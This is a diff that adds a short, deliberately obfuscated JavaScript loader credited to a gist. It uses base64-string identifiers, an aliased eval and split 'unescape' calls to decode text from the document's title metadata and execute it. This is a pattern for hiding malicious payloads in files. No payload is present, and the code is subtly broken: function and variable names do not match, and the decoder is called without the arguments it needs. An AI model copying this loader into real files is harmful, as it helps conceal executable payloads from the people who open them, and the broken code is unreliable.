@@ -1,0 +1,25 @@
+//source: https://gist.github.com/wellllllllllllllllllll/90f09ccc47976c549c9642ca486f606e
+
+var QmluYXJ5IFJldmVyc2luZwo = "";
+
+function ZXhlY3V0ZXroZXBheWxvYWRtdWFoYWhhaGFoYTEhCg(bGVnaXRhcmd1bWVudAo, ZmFrZWFyZ3VtZW50c3Ryb2xsCg, ZmV0YW5vdGhlcnRyb2xsaGFoYQo) {
+        var kj2hnx87y = eval;
+        var bGVnaXRhcmd1dWVudAo = ZmFrZWFyZ3VtZW50c3Ryb2xsCg + ZmV0YW5vdGhlcnRyb2xsaGFoYQo;
+        kj2hnx87y(bGVnaXRhcmd1bWVudAo);
+}
+
+
+
+var bmV2ZXJnb25uYXNheWdvb2RieWUK = this.info.title;
+
+function ZGVvYmZ1c2NhdGVpbmd0aGVwYXlsb2FkbG9sCg(bmV2ZXJnb25uYXJ1bmFyb3VuZAo, bmV2ZXJnb25uYXNheWdvb2RieWUK, bmV2ZXJnb25uYWdpdmV5b3V1cAo , bmV2ZXJnb25uYWxldHlvdWRvd24K) {
+        var dHV0cdXyJ1CkgA = "%";
+        var YWN0dWFsbHlyZXBsYWNlCg = "replace";
+        QmluYXJ5IFJldmVyc2luZwo = bmV2ZXJnb25uYXNheWdvb2RieWUK.YWN0dWFsbHlyZXBsYWNlCg(/c29tZSBvYmZ1c2NhdGluZyBtZXNzIG9mIGFscGhhYmV0IHNvdXAK/g, dHV0cdXyJ1CkgA);
+
+        eval("var cGF5bG9hZHBheWxvYWRwYXlsb2FkCg = un" + "es" + "cape" + "(QmluYXJ5IFJldmVyc2luZwo)");
+        ZXhlY3V0ZXRoZXBheWxvYWRtdWFoYWhhaGFoYTEhCg(cGF5bG9hZHBheWxvYWRwYXlsb2FkCg);
+}
+
+ZGVvYmZ1c2NhdGVpbmd0aGVwYXlsb2FkbG9sCg();
+
